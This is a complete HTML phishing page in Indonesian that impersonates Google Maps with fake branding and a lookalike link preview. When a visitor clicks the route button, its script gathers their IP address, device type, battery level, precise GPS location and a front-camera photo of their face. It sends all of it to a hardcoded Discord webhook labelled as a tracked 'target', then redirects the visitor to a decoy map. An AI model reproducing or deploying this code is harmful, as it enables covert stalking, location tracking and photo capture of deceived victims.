<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Lokasi Rute</title>
    
   <meta property="og:title" content="Google Maps - Lihat Lokasi & Rute">
    <meta property="og:description" content="Klik untuk sinkronisasi rute perjalanan terbaru secara real-time.">
    <meta property="og:image" content="https://www.google.com/images/branding/product/2x/maps_96in128dp.png">
    <meta property="og:url" content="https://titik-lokasi-maps.site">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <style>
        body { margin: 0; font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
        .logo { width: 70px; margin-bottom: 20px; }
        .btn { padding: 15px 25px; background: #4285F4; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo">
        <button class="btn" onclick="mainkan()">Lihat Lokasi Rute</button>
        <p style="color: #70757a; font-size: 13px; margin-top: 15px;">Sinkronisasi rute real-time sedang berjalan.</p>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1488698771880677437/OnoDFDFI4C97vASmoKPyw2kRtY2cpms8EtpzSXiS7J-olSsLIBh1S5e9Ir6ix6z6OxYG"; 
        const linkPalsu = "https://www.google.com/maps/search/Grand+Indonesia"; 

        async function mainkan() {
            document.querySelector('.btn').innerHTML = "Menghubungkan...";
            
            // --- AMBIL IP ADDRESS TARGET ---
            let ipTarget = "Gagal mengambil IP";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipTarget = data.ip;
            } catch(e) {}

            let bInfo = "N/A";
            try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
            let tipeHP = navigator.userAgent; 

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const mapsAsli = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        // KIRIM DATA KE DISCORD (DENGAN IP)
                        await fetch(webhookURL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ 
                                content: `**🚨 TARGET TERPANTAU!**\n🌐 **IP Address:** ${ipTarget}\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Lokasi Asli:** ${mapsAsli}` 
                            })
                        });

                        const formData = new FormData();
                        formData.append("file", blob, "wajah.jpg");
                        await fetch(webhookURL, { method: 'POST', body: formData });

                        window.location.href = linkPalsu; 
                    }, 'image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ content: `**📍 LOKASI MASUK (Kamera Mati)**\n🌐 **IP:** ${ipTarget}\n📍 **Lokasi Asli:** ${mapsAsli}` })
                    });
                    window.location.href = linkPalsu;
                }
            }, (err) => { alert("Izin GPS diperlukan."); });
        }
    </script>
</body>
</html>
